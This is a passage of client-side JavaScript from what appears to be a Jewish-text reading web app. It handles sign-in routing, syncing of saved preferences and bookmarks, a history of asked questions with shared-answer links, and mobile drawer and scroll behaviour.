        // The URL's `auth` against the modal on screen, on every route
        // change: Back off /signin closes the modal, Forward onto it reopens
        // it. Before Clerk has loaded, initClerkAuth's handleAuthRouteIntent
        // opens it instead.
        function syncAuthRoute(route) {
            const page = route?.auth || '';
            if (!page) {
                // Left /signin some other way (Back): no longer a return trip.
                authReturnPath = null;
                if (authModal) closeAuthModal();
                return;
            }
            if (window.Clerk?.loaded) void showAuthModal(page);
            else if (!clerkStart) void ensureClerk(); // its init opens the modal the URL names
        }

        async function handleSignIn() {
            await openAuthRoute('signin');
        }

        // "Create free account" in the guest-limit dialog: Clerk's own sign-up
        // modal, back to this same page afterwards. Without Clerk's sign-up
        // (or if it fails to open) the sign-in modal offers it too.
        async function handleSignUp() {
            await ensureClerk();
            if (!window.Clerk?.openSignUp) {
                await handleSignIn();
                return;
            }
            try {
                await openAuthRoute('signup');
            } catch (error) {
                console.warn('Unable to open the Clerk sign-up modal:', error);
                await handleSignIn();
            }
        }

        async function handleSignOut() {
            if (!window.Clerk) return;
            await window.Clerk.signOut();
            await refreshAuthUi();
        }

        async function openClerkUserProfile(intent = 'profile') {
            await openAuthRoute(intent === 'settings' ? 'settings' : 'profile');
        }

        async function handleAuthRouteIntent() {
            const page = currentAuthPage();
            if (!page) return;
            if (!isClerkConfigured() || !window.Clerk) {
                leaveAuthRoute();
                return;
            }
            await showAuthModal(page);
        }

        // ─── CLIENT-SIDE CACHE FOR PRAYERS & COMMUNITIES ─────────────────────
        const textsCache = {
            prayers: {},
            communities: {},
            prayersList: null,
            communitiesList: null,
            parashaQuickLink: null,
            parashaQuickLinkTs: 0,
            parashaRequest: null,
            popularTexts: null,
            popularTextsTs: 0,
        };

        function normalizeShelfShape(value) {
            const base = {
                recent: [],
                bookmarks: [],
                notes: {},
                tracks: { 'Daily Study': [] },
            };
            if (!value || typeof value !== 'object') return base;

            const recent = Array.isArray(value.recent) ? value.recent : [];
            const bookmarks = Array.isArray(value.bookmarks) ? value.bookmarks : [];
            const notes = value.notes && typeof value.notes === 'object' ? value.notes : {};
            const tracks = value.tracks && typeof value.tracks === 'object' ? value.tracks : { 'Daily Study': [] };

            if (!Array.isArray(tracks['Daily Study'])) {
                tracks['Daily Study'] = [];
            }

            return {
                recent,
                bookmarks,
                notes,
                tracks,
            };
        }

        function getShelfData() {
            try {
                const raw = localStorage.getItem(APP_SHELF_KEY);
                const parsed = raw ? JSON.parse(raw) : null;
                return normalizeShelfShape(parsed);
            } catch {
                return normalizeShelfShape(null);
            }
        }

        function saveShelfData(shelf) {
            localStorage.setItem(APP_SHELF_KEY, JSON.stringify(normalizeShelfShape(shelf)));
            debouncedPushPrefsToServer();
        }

        // Deep-link display overrides (router.js DISPLAY_KEYS). A link like
        // ?text=Genesis.1&layout=hebrew&taamim=0 changes how THIS page looks
        // without rewriting the visitor's own saved preferences:
        // routePrefOverrides remembers each overridden pref's own value, and
        // persistablePrefs() writes that value back in its place. Touching
        // the matching reader control hands the pref back to the visitor
        // (releaseRouteDisplayPref) -- from then on it saves normally.
        const ROUTE_DISPLAY_PREFS = {
            layout: { pref: 'readerLayout', read: (v) => v, write: String },
            vowels: { pref: 'showVowels', read: (v) => v === '1', write: (v) => (v !== false ? '1' : '0') },
            taamim: { pref: 'showCantillation', read: (v) => v === '1', write: (v) => (v !== false ? '1' : '0') },
            translit: { pref: 'transliteration', read: (v) => v === '1', write: (v) => (v ? '1' : '0') },
            size: { pref: 'fontSize', read: Number, write: String },
        };
        let routePrefOverrides = {};

        function persistablePrefs() {
            return { ...appState.prefs, ...routePrefOverrides };
        }

        // Returns true when any reader pref changed, so the caller can
        // re-render once. A key missing from `route` (e.g. after back/forward)
        // restores the visitor's own value.
        function applyRouteDisplayPrefs(route = {}) {
            let changed = false;
            Object.entries(ROUTE_DISPLAY_PREFS).forEach(([routeKey, spec]) => {
                if (route[routeKey] !== undefined) {
                    if (!(spec.pref in routePrefOverrides)) {
                        routePrefOverrides[spec.pref] = appState.prefs[spec.pref];
                    }
                    const value = spec.read(route[routeKey]);
                    if (appState.prefs[spec.pref] !== value) changed = true;
                    appState.prefs[spec.pref] = value;
                } else if (spec.pref in routePrefOverrides) {
                    if (appState.prefs[spec.pref] !== routePrefOverrides[spec.pref]) changed = true;
                    appState.prefs[spec.pref] = routePrefOverrides[spec.pref];
                    delete routePrefOverrides[spec.pref];
                }
            });
            if (route.lang) {
                if (route.lang !== getCurrentLanguage()) toggleLanguage(route.lang, { auto: true, fromRoute: true });
            } else if (languageFromRoute) {
                // Back to an entry without the link's ?lang=: the visitor's own
                // language again, as with the reader keys above.
                toggleLanguage(savedLanguage(), { auto: true });
            }
            return changed;
        }

        // The visitor just changed `routeKey`'s setting themselves: it's
        // theirs again (saved normally), and the link's key leaves the
        // address bar.
        function releaseRouteDisplayPref(routeKey) {
            const spec = ROUTE_DISPLAY_PREFS[routeKey];
            if (spec) delete routePrefOverrides[spec.pref];
            const router = window.ShelahRouter;
            if (router?.readRoute()[routeKey] === undefined) return;
            router.pushRoute({ [routeKey]: null }, { replace: true });
        }

        // The address names the content, not how it's displayed (audit U-8):
        // the visitor's own reader settings are never written to it. A key
        // a link brought stays while it still overrides that setting, so a
        // refresh looks the same; anything else is dropped.
        function readerDisplayRoutePatch() {
            const patch = {};
            Object.entries(ROUTE_DISPLAY_PREFS).forEach(([key, spec]) => {
                patch[key] = spec.pref in routePrefOverrides ? spec.write(appState.prefs[spec.pref]) : null;
            });
            return patch;
        }

        function syncReaderDisplayRoute() {
            const router = window.ShelahRouter;
            if (!router || appState.currentView?.type !== 'text') return;
            const route = router.readRoute();
            if (!route.text) return;
            const patch = readerDisplayRoutePatch();
            if (Object.keys(patch).every((key) => (route[key] ?? null) === patch[key])) return;
            router.pushRoute(patch, { replace: true });
        }

        function savePrefs() {
            localStorage.setItem(APP_PREFS_KEY, JSON.stringify(persistablePrefs()));
            debouncedPushPrefsToServer();
        }

        function syncPrefsInputsFromState() {
            readerLayoutSelect.value = appState.prefs.readerLayout;
            readerFontSize.value = String(appState.prefs.fontSize);
            readerLineHeight.value = String(appState.prefs.lineHeight);

            if (transliterationToggle) transliterationToggle.checked = Boolean(appState.prefs.transliteration);
            if (showVowelsToggle) showVowelsToggle.checked = appState.prefs.showVowels !== false;
            if (showCantillationToggle) showCantillationToggle.checked = appState.prefs.showCantillation !== false;
            if (shulModeToggle) shulModeToggle.checked = Boolean(appState.prefs.shulMode);
            if (shulAutoScrollToggle) shulAutoScrollToggle.checked = Boolean(appState.prefs.shulAutoScroll);
            if (shulScrollSpeed) shulScrollSpeed.value = String(appState.prefs.shulScrollSpeed || 28);
            refreshReaderSliderFills();
            updateThemeToggleUi();
        }

        function updateReaderRangeFill(sliderEl) {
            if (!sliderEl) return;
            const min = Number(sliderEl.min || 0);
            const max = Number(sliderEl.max || 100);
            const value = Number(sliderEl.value || min);
            const span = max - min;
            const progress = span > 0 ? ((value - min) / span) * 100 : 0;
            sliderEl.style.setProperty('--range-progress', `${Math.max(0, Math.min(100, progress))}%`);
        }

        function refreshReaderSliderFills() {
            updateReaderRangeFill(readerFontSize);
            updateReaderRangeFill(readerLineHeight);
            updateReaderRangeFill(shulScrollSpeed);
        }

        async function loadPrefsFromServerIfSignedIn() {
            if (!isClerkConfigured() || !window.Clerk?.session || !window.Clerk?.user) {
                return;
            }

            try {
                const headers = await authHeaders();
                const response = await fetch('/api/user/preferences', { headers });
                if (!response.ok) {
                    return;
                }

                const data = await response.json();
                if (!data?.prefs || typeof data.prefs !== 'object') {
                    return;
                }

                appState.prefs = {
                    ...appState.prefs,
                    ...data.prefs,
                    metadataFilters: normalizeMetadataFilters(data.prefs.metadataFilters || appState.prefs.metadataFilters),
                };

                if (data.reading_state && typeof data.reading_state === 'object') {
                    appState.readingState = data.reading_state;
                }

                const incomingShelf = (data.shelf && typeof data.shelf === 'object')
                    ? normalizeShelfShape(data.shelf)
                    : getShelfData();
                const incomingNotes = (data.notes && typeof data.notes === 'object') ? data.notes : {};
                incomingShelf.notes = {
                    ...incomingShelf.notes,
                    ...incomingNotes,
                };
                localStorage.setItem(APP_SHELF_KEY, JSON.stringify(incomingShelf));

                // The server's values are the visitor's own now: re-apply any
                // deep-link display overrides on top of them.
                routePrefOverrides = {};
                applyRouteDisplayPrefs(window.ShelahRouter?.readRoute() || {});

                syncPrefsInputsFromState();

                localStorage.setItem(APP_PREFS_KEY, JSON.stringify(persistablePrefs()));
                applyReaderPreferences();
                applySidebarVisibility();
                applyShulMode();
                renderPersonalShelf();
                updateBookmarkButton();
                window.ShelahState?.announceMinhag?.();
                logReliability('prefs-synced-from-server');
            } catch {
                // Keep local preferences if remote sync is unavailable.
            }
        }

        async function pushPrefsToServer() {
            if (!isClerkConfigured() || !window.Clerk?.session || !window.Clerk?.user) {
                return;
            }

            try {
                const shelf = getShelfData();
                const headers = await authHeaders({ 'Content-Type': 'application/json' });
                await fetch('/api/user/preferences', {
                    method: 'PUT',
                    headers,
                    body: JSON.stringify({
                        prefs: persistablePrefs(),
                        shelf,
                        notes: shelf.notes || {},
                        reading_state: appState.readingState || {},
                    }),
                });
            } catch {
                // Ignore sync errors and continue using local preferences.
            }
        }

        // ── Ask History ────────────────────────────────────────────────────────

        async function loadAskHistory() {
            const section = document.getElementById('askHistorySection');
            const list = document.getElementById('askHistoryList');
            if (!section || !list) return;
            if (!isClerkConfigured() || !window.Clerk?.session || !window.Clerk?.user) return;

            list.innerHTML = `<div class="ai-src-skeleton-line ai-src-skeleton-line--wide mb-1" aria-hidden="true"></div>
                              <div class="ai-src-skeleton-line ai-src-skeleton-line--medium mb-1" aria-hidden="true"></div>
                              <div class="ai-src-skeleton-line" style="width:70%" aria-hidden="true"></div>`;
            section.classList.remove('hidden');

            try {
                const headers = await authHeaders();
                const resp = await fetch('/api/user/history?limit=20', { headers });
                if (!resp.ok) { section.classList.add('hidden'); return; }
                const data = await resp.json();
                renderAskHistory(data.items || []);
            } catch {
                section.classList.add('hidden');
            }
        }

        // Shared by the history-list click handler and hydrateChatId (URL
        // hydration on load/back-forward) so both paths render an answer and
        // update the URL identically. The answer opens in the conversation
        // panel as its first turn (conversation-ui.js showAnswer).
        function openStoredAskAnswer(item, options = {}) {
            if (!item) return;
            window.ShelahConversationUI?.showAnswer(item);
            // A visitor on a shared link didn't ask anything here.
            if (searchInput) searchInput.value = item.public ? '' : item.question;
            if (!options.fromRoute && item.id) {
                // An entry of its own over the page it opened on, marked so
                // closing the panel steps Back to that page.
                window.ShelahRouter?.pushRoute({ chat: item.id }, options.replace
                    ? { exclusive: true, replace: true }
                    : { exclusive: true, overlay: 'answer' });
            }
        }

        function renderAskHistory(items) {
            const section = document.getElementById('askHistorySection');
            const list = document.getElementById('askHistoryList');
            if (!section || !list) return;

            if (!items.length) {
                section.classList.add('hidden');
                return;
            }

            section.classList.remove('hidden');
            list.innerHTML = items.map((item) => {
                const q = escapeHtml(String(item.question || '').trim().slice(0, 80));
                const date = item.created_at
                    ? new Date(item.created_at).toLocaleDateString(undefined, { month: 'short', day: 'numeric' })
                    : '';
                const id = escapeHtml(String(item.id || ''));
                return `
                    <div class="ask-history-item group flex items-start gap-1.5" data-id="${id}">
                        <button type="button"
                            class="ask-history-q flex-1 text-start text-xs text-slate-700 hover:text-navy leading-snug py-1 truncate"
                            data-id="${id}"
                            title="${q}">
                            <span class="ask-history-date text-[10px] text-slate-400 block">${date}</span>
                            ${q}
                        </button>
                        <button type="button"
                            class="ask-history-del opacity-0 group-hover:opacity-100 shrink-0"
                            data-id="${id}"
                            aria-label="Delete"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="14" height="14" fill="currentColor" aria-hidden="true"><path d="${PHOSPHOR_PATHS['x']}"/></svg></button>
                    </div>`;
            }).join('');

            list.querySelectorAll('.ask-history-q').forEach((btn) => {
                btn.addEventListener('click', () => {
                    const id = btn.dataset.id;
                    const item = items.find(i => i.id === id);
                    openStoredAskAnswer(item);
                });
            });

            list.querySelectorAll('.ask-history-del').forEach((btn) => {
                btn.addEventListener('click', async () => {
                    const id = btn.dataset.id;
                    if (await deleteAskHistoryEntry(id)) {
                        dropShelfAsk(id);
                        askHistoryPage?.refresh();
                    }
                    await loadAskHistory();
                });
            });
        }

        async function deleteAskHistoryEntry(id) {
            try {
                const headers = await authHeaders();
                const resp = await fetch(`/api/user/history/${encodeURIComponent(id)}`, { method: 'DELETE', headers });
                return resp.ok;
            } catch {
                return false;
            }
        }

        // One stored answer of the caller's: the item, or null when there is
        // none (404: deleted, or not theirs). Other failures throw, so a
        // caller can tell "gone" from "couldn't check".
        async function fetchAskHistoryEntry(id) {
            const headers = await authHeaders();
            const resp = await fetch(`/api/user/history/${encodeURIComponent(id)}`, { headers });
            if (resp.status === 404) return null;
            if (!resp.ok) throw new Error(`history entry ${resp.status}`);
            return resp.json();
        }

        // A page of the caller's history ({ items, next_cursor }); q filters
        // on the question text (backend/routes_user.py get_ask_history).
        async function fetchAskHistoryPage({ q = '', cursor = '', limit } = {}) {
            const qs = window.ShelahAskHistory.historyQueryString({ q, cursor, limit });
            const headers = await authHeaders();
            const resp = await fetch(`/api/user/history?${qs}`, { headers });
            if (!resp.ok) throw new Error(`history ${resp.status}`);
            return resp.json();
        }

        function askHistoryAuthState() {
            if (!isClerkConfigured()) return 'unavailable';
            if (!window.Clerk) {
                if (document.readyState === 'loading') return 'pending';
                if (!clerkStart) return clerkFailed ? 'unavailable' : 'signed-out'; // never started: no Clerk cookie
                return 'pending';
            }
            if (window.Clerk.user && window.Clerk.session) return 'signed-in';
            return window.Clerk.loaded ? 'signed-out' : 'pending';
        }

        // Shelf 'ask' entries hold the answer's ask_history id (label = the
        // question), so reopening one shows the stored answer instead of
        // paying for /ask again. Entries saved before that held the question
        // text; they're rewritten here once the answer's id is known.
        function promoteShelfAsk(question, id) {
            const next = window.ShelahAskHistory?.promoteAskEntries(getShelfData(), question, id);
            if (appState.currentView?.type === 'ask'
                && window.ShelahAskHistory?.sameQuestion(appState.currentView.value, question)) {
                appState.currentView = { type: 'ask', value: id, label: appState.currentView.label || question };
                window.ShelahState?.setState({ currentView: appState.currentView });
            }
            if (next) {
                saveShelfData(next);
                renderPersonalShelf();
            }
            updateBookmarkButton();
        }

        function dropShelfAsk(id) {
            const shelf = getShelfData();
            const keep = (item) => !(item?.type === 'ask' && item.value === id);
            if (shelf.recent.every(keep) && shelf.bookmarks.every(keep)) return;
            shelf.recent = shelf.recent.filter(keep);
            shelf.bookmarks = shelf.bookmarks.filter(keep);
            saveShelfData(shelf);
            renderPersonalShelf();
        }

        // ── /history page ──────────────────────────────────────────────────
        // static/js/ask-history.js renders and drives the list; this sets up
        // the reader around it the way displayCommunity() does.
        const _ASK_HISTORY_ICONS = {
            search: phosphorPathMarkup('magnifying-glass'),
            delete: phosphorPathMarkup('trash'),
        };
        let askHistoryPage = null;

        function closeAskHistoryPage() {
            askHistoryPage?.destroy();
            askHistoryPage = null;
        }

        function displayAskHistoryPage(options = {}) {
            if (!window.ShelahAskHistory) return;
            // Back from /answer/<id> lands here: the list, not the answer
            // still open over it.
            // Already showing (back from an answer opened here): keep its
            // search and loaded pages as they were.
            if (askHistoryPage && appState.currentView?.type === 'history'
                && document.getElementById('askHistoryPageRoot')?.isConnected && !reader.classList.contains('hidden')) {
                return;
            }
            // It renders into the reader: a text still loading there stops.
            cancelReaderLoad();
            const title = t('Your questions', 'השאלות שלך');
            setCurrentView('history', '1', title, options);
            void swapView(() => {
                closeAskHistoryPage();
                closeMobilePanels();
                closeTextsMenu();
                closeReaderSettingsPanel();
                homeGrid.style.display = 'none';
                finishViewSwap();
                reader.classList.remove('hidden');
                readerTopBar?.classList.add('hidden');
                applySidebarVisibility();
                setReaderSubtitle('');

                document.getElementById('readerTitle').innerText = title;
                window.currentCommunityData = null;
                window.currentPrayerContent = null;
                window.currentPrayerParagraphPairs = [];
                window.currentPrayerName = null;
                window.currentTextPayload = null;
                window.currentTextPayloadChain = [];
                resetInfiniteReaderState(null);
                collapseCommentaryPanel();
                resetSelectionInsights();
                syncReaderSettingsVisibility();
                document.getElementById('readerSources').innerHTML = '';
                sidebarContent.innerHTML = `<p class="text-xs text-slate-500">${t(
                    'Every answer you get while signed in is saved here. Open one to read it again, copy its link, or share it.',
                    'כל תשובה שמתקבלת כשאת/ה מחובר/ת נשמרת כאן. פתח/י תשובה כדי לקרוא אותה שוב, להעתיק קישור או לשתף.')}</p>`;

                // A child of #readerContent, so the page's listeners go away with
                // it the moment another view renders there.
                const content = document.getElementById('readerContent');
                content.innerHTML = '<div id="askHistoryPageRoot"></div>';
                askHistoryPage = window.ShelahAskHistory.createHistoryPage(document.getElementById('askHistoryPageRoot'), {
                    authState: askHistoryAuthState,
                    fetchPage: ({ q, cursor }) => fetchAskHistoryPage({ q, cursor }),
                    deleteEntry: deleteAskHistoryEntry,
                    openEntry: (item) => openStoredAskAnswer(item),
                    signIn: () => { void handleSignIn(); },
                    onDeleted: (id) => {
                        dropShelfAsk(id);
                        void loadAskHistory();
                    },
                    t,
                    escapeHtml,
                    formatDate: (iso) => new Date(iso).toLocaleDateString(isHebrewMode() ? 'he' : undefined,
                        { year: 'numeric', month: 'short', day: 'numeric' }),
                    answerHref: (id) => `/answer/${encodeURIComponent(id)}`,
                    icons: _ASK_HISTORY_ICONS,
                    // /history?q= (audit U-15): a link or a refresh opens on
                    // the same search; typing replaces the URL, never pushes.
                    initialQuery: options.query || '',
                    onQueryChange: (q) => window.ShelahRouter?.pushRoute({ q: q || null }, { replace: true }),
                });
                scrollPrimaryToTop('instant');
                releaseViewScroll();
            });
        }

        // Sign-in finishing (or signing out) while the page shows.
        document.addEventListener('shelah:auth-changed', () => askHistoryPage?.refresh());
        document.getElementById('askHistoryViewAll')?.addEventListener('click', (event) => {
            if (event.button > 0 || event.metaKey || event.ctrlKey || event.shiftKey || event.altKey) return;
            event.preventDefault();
            displayAskHistoryPage();
        });

        // Resolves an /answer/<id> (old: ?chat=<id>) deep link against the
        // caller's own history. GET /api/user/history/<id> is scoped
        // server-side to who is asking: the verified Clerk user (bearer
        // token) and/or, signed out, the device that saved the answer
        // (backend/device_identity.py: the shelah_device cookie, which a
        // same-origin fetch sends by itself). A stale/foreign/deleted id 404s.
        // Signed in that is a dead link and the URL goes; signed out it may
        // be an account's answer, so the URL stays and the panel offers
        // sign-in, which brings the visitor back here (refreshAuthUi).
        // `settled: true` skips waiting for Clerk (it failed to load).
        let chatHydrating = null;
        async function hydrateChatId(id, { settled = false } = {}) {
            if (!id) return;
            const conversationUi = window.ShelahConversationUI;
            if (conversationUi?.reopenAnswer?.(id)) return;
            // Clerk's several auth events re-enter here for the same link.
            if (chatHydrating === id) return;
            // The answer's loading state from the start (audit L-5), not a
            // silent return to home.
            conversationUi?.showSavedLoading?.();
            // Clerk is still deciding who this is: its first settle
            // (refreshAuthUi) comes back here, and the bearer token (if any)
            // must be on the request or an account's answer would 404.
            if (!settled && isClerkConfigured() && !window.Clerk?.loaded) return;
            const signedIn = Boolean(window.Clerk?.session);
            chatHydrating = id;
            let resp = null;
            try {
                const headers = await authHeaders();
                resp = await fetch(`/api/user/history/${encodeURIComponent(id)}`, { headers, cache: 'no-store' });
                const item = resp.ok ? await resp.json() : null;
                if (window.ShelahRouter?.readRoute().chat !== id) return;
                if (item) {
                    openStoredAskAnswer(item, { fromRoute: true });
                    return;
                }
            } catch {
                if (window.ShelahRouter?.readRoute().chat !== id) return;
            } finally {
                chatHydrating = null;
            }
            const missing = resp?.status === 404 || (resp?.status === 401 && !signedIn);
            if (missing && !signedIn && isClerkConfigured() && !settled) {
                conversationUi?.showSavedUnavailable?.(true, { signIn: true });
                return;
            }
            // Not this account's, or deleted: the link is dead, so it goes.
            // Anything else keeps it for a reload to try again.
            const gone = resp?.status === 404;
            if (gone) window.ShelahRouter?.pushRoute({ chat: null }, { replace: true });
            conversationUi?.showSavedUnavailable?.(gone);
        }

        // Resolves an /a/<share token> (old: ?a=) public link
        // (backend/routes_answer_share.py; a conversation's link,
        // backend/routes_conversation_share.py, is the same shape and answers
        // with `conversation: true` and its turns).
        // No auth: it works signed out, and opens the answer read-only -- no
        // Share / Stop sharing (the payload carries no history id), no
        // follow-up hint. Visitors can still rate an answer (feedbackAnswerLink). A 404 means
        // the link was revoked, never existed, or the answer was deleted: the
        // key is cleared and the visitor is told. Other failures keep the key
        // so a reload can retry.
        async function hydratePublicAnswer(token) {
            if (!token) return;
            window.ShelahConversationUI?.showPublicLoading();
            let resp = null;
            let item = null;
            try {
                resp = await fetch(`/api/public/answer/${encodeURIComponent(token)}`, { cache: 'no-store' });
                if (resp.ok) item = await resp.json();
            } catch {
                item = null;
            }
            // The visitor may have navigated elsewhere while this loaded.
            if (window.ShelahRouter?.readRoute().a !== token) return;
            if (item?.conversation && Array.isArray(item.messages)) {
                if (searchInput) searchInput.value = '';
                window.ShelahConversationUI?.showPublicConversation(item);
                return;
            }
            if (item?.answer) {
                // share_token stays on this client-side copy: feedback sends it
                // (feedbackAnswerLink) since the payload carries no row id.
                openStoredAskAnswer({ ...item, public: true, share_token: token }, { fromRoute: true });
                return;
            }
            const gone = resp?.status === 404;
            if (gone) window.ShelahRouter?.pushRoute({ a: null }, { replace: true });
            window.ShelahConversationUI?.showPublicUnavailable(gone);
        }

        function setReaderSubtitle(text = '') {
            if (!readerSubtitle) return;
            const value = String(text || '').trim();
            if (!value) {
                readerSubtitle.textContent = '';
                readerSubtitle.classList.add('hidden');
                return;
            }
            readerSubtitle.textContent = value;
            readerSubtitle.classList.remove('hidden');
        }

        // The parasha a chapter falls in: the last one that starts at or before it.
        function parashaForChapter(parashot, chapter) {
            let matched = parashot[0] || null;
            for (const parasha of parashot) {
                if (chapter >= parasha.chapter) {
                    matched = parasha;
                }
            }
            return matched ? { ...matched, chapter } : null;
        }

        function getTorahParashaForRef(ref, categories = []) {
            if (!Array.isArray(categories) || !categories.includes('Torah')) {
                return null;
            }

            const refText = String(ref || '').trim();
            if (!refText) return null;

            const book = Object.keys(TORAH_PARASHA_BY_BOOK).find((name) => refText === name || refText.startsWith(`${name} `));
            if (!book) return null;

            const chapterMatch = /^(\d+)/.exec(refText.slice(book.length).trim());
            if (!chapterMatch) return null;

            const chapter = Number(chapterMatch[1]);
            if (!Number.isFinite(chapter)) return null;

            return parashaForChapter(TORAH_PARASHA_BY_BOOK[book], chapter);
        }

        function isMobileViewport() {
            return window.matchMedia('(max-width: 1023px)').matches;
        }

        // Animated show / hide for menus, sheets and modals (window.ShelahMotion
        // present/dismiss, see motion.js). They own the `hidden` class so an
        // element only becomes display:none once its exit has played. Without
        // the module (CDN blocked, stale cache) they degrade to a class toggle.
        function presentEl(el, opts = {}) {
            if (!el) return Promise.resolve();
            if (window.ShelahMotion?.present) return window.ShelahMotion.present(el, opts);
            el.classList.remove('hidden');
            return Promise.resolve();
        }

        function dismissEl(el, opts = {}) {
            if (!el) return Promise.resolve();
            if (window.ShelahMotion?.dismiss) return window.ShelahMotion.dismiss(el, opts);
            el.classList.add('hidden');
            opts.onHidden?.();
            return Promise.resolve();
        }

        // Dialog windows (chapter grid, library category, privacy, calendar)
        // simply fade in where they live, with a barely-there scale settle
        // (motion.js 'window' preset) -- no rise and no flight from the trigger.
        function modalMotion(modal) {
            const card = modal?.querySelector(':scope > div') ?? null;
            return { preset: 'window', card };
        }

        // The drawers slide by their CSS classes: the closed offset differs by
        // side, breakpoint and direction (style.css, sidebar.css own it), and a
        // CSS transition retargets from wherever an interrupted slide got to.
        // What this adds is the close's bookkeeping (audit M-8): a token per
        // drawer, so a close only hides it if nothing newer happened since --
        // a close/open/close burst used to let the first close's timer hide the
        // drawer halfway through the last one's slide -- and only the drawer's
        // own transform transition ends it: transitionend bubbles, and a
        // button's hover fade inside it used to hide it at once.
        const _drawerTokens = new WeakMap();

        function transitionMs(el) {
            const style = getComputedStyle(el);
            const toMs = (v) => (String(v).trim().endsWith('ms') ? Number.parseFloat(v) : Number.parseFloat(v) * 1000) || 0;
            const delays = style.transitionDelay.split(',');
            return Math.max(0, ...style.transitionDuration.split(',').map((d, i) => toMs(d) + toMs(delays[i % delays.length])));
        }

        function setMobileDrawerState(drawer, open) {
            if (!drawer) return;
            const token = (_drawerTokens.get(drawer) || 0) + 1;
            _drawerTokens.set(drawer, token);
            if (open) {
                // Un-hide, force a style flush so the closed position is the
                // transition's starting point, then open. (A single rAF could run
                // before the browser had styled the un-hidden drawer, which made
                // it jump open with no slide.)
                drawer.classList.remove('hidden');
                drawer.getBoundingClientRect();
                drawer.classList.add('mobile-open');
                return;
            }
            if (drawer.classList.contains('hidden')) return;
            drawer.classList.remove('mobile-open');
            let timer = 0;
            const finish = () => {
                drawer.removeEventListener('transitionend', onEnd);
                window.clearTimeout(timer);
                // Superseded, or the sidebars went back to desktop columns.
                if (_drawerTokens.get(drawer) !== token || !isMobileViewport()) return;
                drawer.classList.add('hidden');
            };
            const onEnd = (event) => {
                if (event.target === drawer && event.propertyName === 'transform') finish();
            };
            drawer.addEventListener('transitionend', onEnd);
            // No transition to wait for (reduced motion), or one that never
            // reports its end (a background tab).
            timer = window.setTimeout(finish, transitionMs(drawer) + 80);
        }

        function closeMobilePanels() {
            if (!isMobileViewport()) {
                if (mobileDrawerBackdrop) {
                    mobileDrawerBackdrop.classList.add('hidden');
                }
                document.body.classList.remove('mobile-panel-open');
                return;
            }

            setMobileDrawerState(leftSidebar, false);
            setMobileDrawerState(rightSidebar, false);
            dismissEl(mobileDrawerBackdrop, { preset: 'fade' });
            document.body.classList.remove('mobile-panel-open');
            // The Library tab lit up because its drawer was open; with the drawer
            // gone the screen underneath is what is current again.
            if (mobileBottomTabs?.querySelector('.mobile-tab-active')?.dataset.mobileTab === 'library') {
                setActiveMobileTab('home');
            }
        }

        function openMobilePanel(panel) {
            if (!isMobileViewport()) return;

            const openLeft = panel === 'left';
            const openRight = panel === 'right';
            setMobileDrawerState(leftSidebar, openLeft);
            setMobileDrawerState(rightSidebar, openRight);

            presentEl(mobileDrawerBackdrop, { preset: 'fade' });
            document.body.classList.add('mobile-panel-open');
        }

        function toggleMobilePanel(panel) {
            if (!isMobileViewport()) return;
            const drawer = panel === 'left' ? leftSidebar : rightSidebar;
            if (!drawer) return;
            const isOpen = drawer.classList.contains('mobile-open');
            if (isOpen) {
                closeMobilePanels();
                return;
            }
            openMobilePanel(panel);
        }

        function openLibrarySidebar() {
            if (isMobileViewport()) {
                openMobilePanel('left');
                return;
            }
            setSidebarVisibility('left', true);
        }

        function getPrimaryScrollElement() {
            const pageScroller = document.scrollingElement || document.documentElement;
            if (!mainContainer) return pageScroller;

            const mainCanScroll = mainContainer.scrollHeight > (mainContainer.clientHeight + 6);
            return mainCanScroll ? mainContainer : pageScroller;
        }

        function getPrimaryScrollTop() {
            const target = getPrimaryScrollElement();
            if (target === document.documentElement || target === document.body) {
                return window.pageYOffset || document.documentElement.scrollTop || 0;
            }
            return target.scrollTop;
        }

        // The behavior a scroll from script uses. 'smooth' honours reduced
        // motion (an explicit smooth scroll overrides the CSS rule that turns
        // it off); anything else is 'instant', since with html's
        // scroll-behavior:smooth an 'auto' scroll animates too.
        function scrollBehavior(requested = 'smooth') {
            if (requested !== 'smooth') return 'instant';
            return window.matchMedia('(prefers-reduced-motion: reduce)').matches ? 'instant' : 'smooth';
        }

        function scrollPrimaryBy(deltaY) {
            const target = getPrimaryScrollElement();
            if (target === document.documentElement || target === document.body) {
                window.scrollTo({ top: getPrimaryScrollTop() + deltaY, behavior: 'instant' });
                return;
            }
            target.scrollTop += deltaY;
        }

        function scrollPrimaryToTop(requested = 'smooth') {
            const behavior = scrollBehavior(requested);
            const target = getPrimaryScrollElement();
            if (target === document.documentElement || target === document.body) {
                window.scrollTo({ top: 0, behavior });
                return;
            }
            target.scrollTo({ top: 0, behavior });
        }

        function handleInfiniteReaderScroll() {
            if (shouldLoadNextTextChunk()) {
                void loadNextTextChunk();
            }
        }

        function scrollElementToTop(targetEl, requested = 'smooth', topPadding = 8) {
            if (!targetEl) return;
            const behavior = scrollBehavior(requested);
            const target = getPrimaryScrollElement();
            const rect = targetEl.getBoundingClientRect();

            if (target === document.documentElement || target === document.body) {
                const nextTop = Math.max(0, (window.pageYOffset || 0) + rect.top - topPadding);
                window.scrollTo({ top: nextTop, behavior });
                return;
            }

            const containerRect = target.getBoundingClientRect();
            const nextTop = Math.max(0, target.scrollTop + (rect.top - containerRect.top) - topPadding);
            target.scrollTo({ top: nextTop, behavior });
        }

        function focusHomeDailySection() {
            const dailySection = document.getElementById('dailyPulseColumn');
            if (!dailySection) return;

            const homeVisible = homeGrid && homeGrid.style.display !== 'none';
            if (!homeVisible) {
                goHome();
                window.setTimeout(() => {
                    scrollElementToTop(dailySection, 'smooth', 8);
                }, 120);
                return;
            }

            scrollElementToTop(dailySection, 'smooth', 8);
        }

        function setActiveMobileTab(tab) {
            if (!mobileBottomTabs) return;
            mobileBottomTabs.querySelectorAll('[data-mobile-tab]').forEach((btn) => {
                btn.classList.toggle('mobile-tab-active', btn.dataset.mobileTab === tab);
            });
            syncMobileTabIndicator({ animate: true });
        }

        // Places the sliding pill behind the active tab. Geometry is read from the
        // button (offsetLeft/Top/Width/Height are physical, so this is the same in
        // LTR and RTL) and applied instantly; only the horizontal travel is
        // animated, by a spring (ShelahMotion.slideTo). animate:false is for
        // resize / first paint, where the pill should simply be in the right place.
        function syncMobileTabIndicator({ animate = false } = {}) {
            const indicator = document.getElementById('mobileTabIndicator');
            if (!indicator || !mobileBottomTabs) return;
            const active = mobileBottomTabs.querySelector('.mobile-tab-active');
            // Hidden nav (desktop) reports 0 sizes: nothing to place.
            if (!active?.offsetWidth) {
